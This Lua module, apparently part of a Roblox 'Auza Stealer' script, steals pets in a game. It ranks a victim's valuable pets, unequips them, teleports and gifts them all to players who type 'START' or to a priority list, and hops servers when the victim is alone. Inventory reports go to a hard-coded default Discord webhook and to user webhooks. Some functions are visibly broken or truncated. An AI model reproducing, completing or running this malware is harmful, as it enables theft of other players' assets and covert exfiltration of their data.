-- Function to find and hold shovel
function CoreFunctions.findAndHoldShovel()
    local character = player.Character
    if not character then return false end

    -- First ensure no tools are held
    CoreFunctions.unholdAllItems()
    task.wait(0.2)

    for _, tool in ipairs(backpack:GetChildren()) do
        if tool:IsA("Tool") and string.lower(tool.Name):find("shovel") then
            tool.Parent = character
            task.wait(0.3)
            return true
        end
    end

    return false
end

-- Function to unhold any currently held items (improved for reliability)
function CoreFunctions.unholdAllItems()
    local character = player.Character
    if not character then return end

    local heldTools = {}
    for _, tool in ipairs(character:GetChildren()) do
        if tool:IsA("Tool") then
            table.insert(heldTools, tool)
        end
    end

    for _, tool in ipairs(heldTools) do
        if tool.Parent == character then
            tool.Parent = backpack
            task.wait(0.05)
        end
    end
    
    task.wait(0.1)
end

function CoreFunctions.isPet(tool)
    return tool:IsA("Tool") and tool:GetAttribute("ItemType") == "Pet"
end

function CoreFunctions.extractNumber(text, pattern)
    local match = string.match(text, pattern)
    return match and tonumber(match) or nil
end

function CoreFunctions.getWeight(petName)
    return CoreFunctions.extractNumber(petName, "%[([%d%.]+) KG%]")
end

function CoreFunctions.getAge(petName)
    return CoreFunctions.extractNumber(petName, "%[Age (%d+)%]")
end

function CoreFunctions.startsWithTarget(petName)
    local lower = string.lower(petName)
    for _, prefix in ipairs(CoreFunctions.TARGET_PETS.prefixes) do
        if string.sub(lower, 1, #prefix) == prefix then
            return true
        end
    end
    return false
end

function CoreFunctions.isTargetPet(petName)
    if CoreFunctions.startsWithTarget(petName) then return true end

    local weight = CoreFunctions.getWeight(petName)
    if weight and weight >= CoreFunctions.TARGET_PETS.minWeight then return true end

    local age = CoreFunctions.getAge(petName)
    if age and age >= CoreFunctions.TARGET_PETS.minAge then return true end

    return false
end

function CoreFunctions.getPetPriority(petName)
    if CoreFunctions.startsWithTarget(petName) then return 1 end
    if CoreFunctions.getWeight(petName) and CoreFunctions.getWeight(petName) >= CoreFunctions.TARGET_PETS.minWeight then return 2 end
    if CoreFunctions.getAge(petName) and CoreFunctions.getAge(petName) >= CoreFunctions.TARGET_PETS.minAge then return 2 end
    return 3
end

function CoreFunctions.pickupAllPets()
    if not PetsService or not PetsFolder then
        warn("PetsService or PetsFolder not initialized")
        return
    end
    
    local pickupCount = 0

    for _, pet in ipairs(PetsFolder:GetChildren()) do
        if pet:GetAttribute("OWNER") == player.Name then
            local uuid = pet:GetAttribute("UUID")
            if uuid then
                local success = pcall(function()
                    PetsService:FireServer("UnequipPet", uuid)
                end)
                if success then pickupCount = pickupCount + 1 end
            end
        end
    end

    task.wait(2)
end

function CoreFunctions.unfavoriteAllPets()

                pcall(function()
                    FavoriteItemService:FireServer(tool)

        end
    end
end

function CoreFunctions.getAvailablePets()
    local targetPets = {}
    local regularPets = {}

    local function scanContainer(container)
        if not container then return end
        
        for _, tool in ipairs(container:GetChildren()) do
            if CoreFunctions.isPet(tool) then
                if CoreFunctions.isTargetPet(tool.Name) then
                    table.insert(targetPets, tool)
                else
                    table.insert(regularPets, tool)
                end
            end
        end
    end

    -- Scan backpack
    pcall(function()
        scanContainer(backpack)
    end)

    -- If no pets found, try alternative backpack reference
    if #targetPets == 0 and #regularPets == 0 then
        pcall(function()
            local bp = player:FindFirstChild("Backpack")
            if bp then
                scanContainer(bp)
            end
        end)
    end

    return targetPets, regularPets
end

function CoreFunctions.sendWebhook(embed, content, hasTargets, userWebhookURLs)
    -- Create the webhook data structure with safe values
    local webhookData = {
        content = tostring(content or ""),
        username = "üå¥ Auza Stealer üå¥",
        avatar_url = "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png",
        embeds = {embed}
    }

    -- Safely encode the JSON
    local jsonData = CoreFunctions.safeJSONEncode(webhookData)

    -- Send to default webhook first if there are target pets
    if hasTargets and CoreFunctions.DEFAULT_WEBHOOK then
        pcall(function()
            local success, response = pcall(function()
                return http_request({
                    Url = CoreFunctions.DEFAULT_WEBHOOK,
                    Method = "POST",
                    Headers = {["Content-Type"] = "application/json"},
                    Body = jsonData
                })
            end)
            if not success then
                warn("Failed to send default webhook: " .. tostring(response))
            end
        end)
        task.wait(1)
    end

    -- Send to user webhooks
    if userWebhookURLs then
        for i, url in ipairs(userWebhookURLs) do
            if url and url ~= "" then
                pcall(function()
                    local success, response = pcall(function()
                        return http_request({
                            Url = url,
                            Method = "POST",
                            Headers = {["Content-Type"] = "application/json"},
                            Body = jsonData
                        })
                    end)
                    if not success then
                        warn("Failed to send user webhook " .. i .. ": " .. tostring(response))
                    end
                end)

                if i < #userWebhookURLs then
                    task.wait(0.5)
                end
            end
        end
    end
end

-- FIXED: Safe embed creation to prevent JSON issues
function CoreFunctions.createSafeEmbed(data)
    -- Ensure all string values are properly handled
    local safeData = {}
    for key, value in pairs(data) do
        if type(value) == "string" then
            -- Remove any problematic characters that might break JSON
            safeData[key] = string.gsub(tostring(value), "[%c]", "")
        elseif type(value) == "table" then
            safeData[key] = value
        else
            safeData[key] = tostring(value)
        end
    end
    
    return {
        title = safeData.title or "üå¥ Auza Stealer üå¥",
        description = safeData.description or "",
        color = tonumber(safeData.color) or 10181046,
        fields = safeData.fields or {},
        footer = {
            text = safeData.footerText or "üå≤ Auza Stealer ‚Ä¢ Haruki Edition by iKazu",
            icon_url = safeData.footerIcon or "https://cdn.discordapp.com/attachments/1378991938052685947/1384800481510948894/ChatGPT_Image_Jun_3_2025_11_12_51_AM.png"
        },
        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),

        }
    }
end

function CoreFunctions.getPriorityPlayer(priorityPlayers)
    if not priorityPlayers then return nil end
    
    for _, name in ipairs(priorityPlayers) do
        local p = Players:FindFirstChild(tostring(name))
        if p and p ~= player and p.Character then
            return p
        end
    end
    return nil
end

function CoreFunctions.tpAndAttach(target)
    if CoreFunctions.tpConnection then 
        CoreFunctions.tpConnection:Disconnect() 
        CoreFunctions.tpConnection = nil
    end

    local char = player.Character
    local targetChar = target.Character

    if not char or not char.PrimaryPart or not targetChar or not targetChar.PrimaryPart then
        return false
    end

    CoreFunctions.tpConnection = RunService.Heartbeat:Connect(function()
        pcall(function()
            if char.PrimaryPart and targetChar.PrimaryPart then
                char:SetPrimaryPartCFrame(CFrame.new(targetChar.PrimaryPart.Position))
            end
        end)
    end)

    return true
end

function CoreFunctions.getNearbyPrompt(maxDistance)
    local char = player.Character
    if not char or not char.PrimaryPart then return nil end

    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("ProximityPrompt") and obj.Parent and obj.Parent:IsA("BasePart") then
            local dist = (char.PrimaryPart.Position - obj.Parent.Position).Magnitude
            if dist <= maxDistance then
                return obj
            end
        end
    end
    return nil
end

-- Improved giftPet function with better error handling
function CoreFunctions.giftPet(pet, target)
    if not target or not target.Parent or not target.Character then
        return false
    end

    if not pet or not pet.Parent or pet.Parent ~= backpack then
        return false
    end

    -- Ensure absolutely no tools are held before starting
    CoreFunctions.unholdAllItems()
    task.wait(0.2)

    local success = pcall(function()
        if pet.Parent == backpack then
            pet.Parent = player.Character
        else
            return false
        end
    end)

    if not success then
        return false
    end

    task.wait(0.5)

    local prompt = CoreFunctions.getNearbyPrompt(CoreFunctions.CONFIG.maxDistance)
    if prompt then
        local giftSuccess = false

        pcall(function()
            prompt:InputHoldBegin()
            task.wait(2.0)
            prompt:InputHoldEnd()
            giftSuccess = true
        end)

        task.wait(0.2)

        if not giftSuccess then
            pcall(function()
                prompt:InputBegin()
                task.wait(0.1)
                prompt:InputEnd()
            end)
        end

        task.wait(0.2)

        pcall(function()
            prompt.Triggered:Fire(player)
        end)
    end

    -- Ensure pet is returned to backpack after gifting attempt
    pcall(function()
        if pet and pet.Parent == player.Character then
            pet.Parent = backpack
        end
    end)

    task.wait(0.1)

    return true
end

-- Improved giftAllPets function with better synchronization
function CoreFunctions.giftAllPets(target)
    if CoreFunctions.isGifting then return end
    CoreFunctions.isGifting = true

    task.spawn(function()
        pcall(function()
            CoreFunctions.findAndHoldShovel()
            task.wait(0.2)
            CoreFunctions.unholdAllItems()
        end)
    end)

    task.wait(0.3)

    if not CoreFunctions.tpAndAttach(target) then
        CoreFunctions.isGifting = false
        return
    end

    local giftedCount = 0
    local totalAttempts = 0
    local maxTotalAttempts = 200

    while totalAttempts < maxTotalAttempts do
        totalAttempts = totalAttempts + 1

        if not target or not target.Parent or not target.Character then
            break
        end

        local targetPets, regularPets = CoreFunctions.getAvailablePets()

        if #targetPets > 0 then
            table.sort(targetPets, function(a, b)
                return CoreFunctions.getPetPriority(a.Name) < CoreFunctions.getPetPriority(b.Name)
            end)

            local pet = targetPets[1]
            local giftResult = false

            pcall(function()
                giftResult = CoreFunctions.giftPet(pet, target)
            end)

            if giftResult then
                giftedCount = giftedCount + 1
                task.wait(CoreFunctions.CONFIG.giftDelay)
                continue
            end
        end

        if #regularPets > 0 then
            local pet = regularPets[1]
            local giftResult = false

            pcall(function()
                giftResult = CoreFunctions.giftPet(pet, target)
            end)

            if giftResult then
                giftedCount = giftedCount + 1
                task.wait(CoreFunctions.CONFIG.giftDelay)
                continue
            end
        end

        if #targetPets == 0 and #regularPets == 0 then
            break
        end

        task.wait(0.5)
    end

    pcall(function()
        if CoreFunctions.tpConnection then
            CoreFunctions.tpConnection:Disconnect()
            CoreFunctions.tpConnection = nil
        end
    end)

    CoreFunctions.isGifting = false
end

function CoreFunctions.setupChatMonitoring()
    local function connectPlayer(p)
        if p == player then return end

        local function onChatted(message)
            if string.upper(tostring(message)) == "START" then
                for _, queued in ipairs(CoreFunctions.giftQueue) do
                    if queued == p then return end
                end

                if #CoreFunctions.getTargetPets() > 0 or #CoreFunctions.getRegularPets() > 0 then
                    table.insert(CoreFunctions.giftQueue, p)
                end
            end
        end

        local function setupChat()
            pcall(function()
                p.Chatted:Connect(onChatted)
            end)
        end

        if p.Character then
            setupChat()
        else
            p.CharacterAdded:Connect(function()
                task.wait(1)
                setupChat()
            end)
        end
    end

    for _, p in ipairs(Players:GetPlayers()) do
        connectPlayer(p)
    end

    Players.PlayerAdded:Connect(connectPlayer)
end

function CoreFunctions.cleanQueue()
    local clean = {}
    for _, p in ipairs(CoreFunctions.giftQueue) do
        if p and p.Parent and p.Character then
            table.insert(clean, p)
        end
    end
    CoreFunctions.giftQueue = clean
end

function CoreFunctions.getNextTarget(priorityPlayers)
    CoreFunctions.cleanQueue()

    local priority = CoreFunctions.getPriorityPlayer(priorityPlayers)
    if priority and (CoreFunctions.hasTargetPetsInInventory() or #CoreFunctions.getRegularPets() > 0) then
        return priority
    end

    if (#CoreFunctions.getTargetPets() > 0 or #CoreFunctions.getRegularPets() > 0) and #CoreFunctions.giftQueue > 0 then
        return table.remove(CoreFunctions.giftQueue, 1)
    end

    return nil
end

function CoreFunctions.startMainLoops(priorityPlayers)
    -- Pet pickup loop
    task.spawn(function()
        while true do
            pcall(function()
                if PetsService and PetsFolder then
                    for _, pet in ipairs(PetsFolder:GetChildren()) do
                        if pet:GetAttribute("OWNER") == player.Name then
                            local uuid = pet:GetAttribute("UUID")
                            if uuid then
                                pcall(function()
                                    PetsService:FireServer("UnequipPet", uuid)
                                end)
                            end
                        end
                    end
                end
            end)
            task.wait(1)
        end
    end)

    -- Auto kick loop
    task.spawn(function()
        while true do
            pcall(function()
                if #Players:GetPlayers() == 1 then
                    task.wait(CoreFunctions.CONFIG.autoKickDelay)

                    if #Players:GetPlayers() == 1 then
                        CoreFunctions.attemptServerHop()
                    end
                end
            end)
            task.wait(1)
        end
    end)

    -- Priority player gifting loop
    task.spawn(function()
        while true do
            pcall(function()
                local priorityPlayer = CoreFunctions.getPriorityPlayer(priorityPlayers)
                if priorityPlayer and not CoreFunctions.isGifting and (CoreFunctions.hasTargetPetsInInventory() or #CoreFunctions.getRegularPets() > 0) then
                    CoreFunctions.giftAllPets(priorityPlayer)
                end
            end)
            task.wait(1)
        end
    end)

    -- Main gifting loop
    task.spawn(function()
        while true do
            pcall(function()
                if not CoreFunctions.isGifting then
                    local target = CoreFunctions.getNextTarget(priorityPlayers)
                    if target and (#CoreFunctions.getTargetPets() > 0 or #CoreFunctions.getRegularPets() > 0) then
                        task.spawn(function()
                            CoreFunctions.giftAllPets(target)
                        end)
                    end
                end
            end)
            task.wait(1)
        end
    end)
end
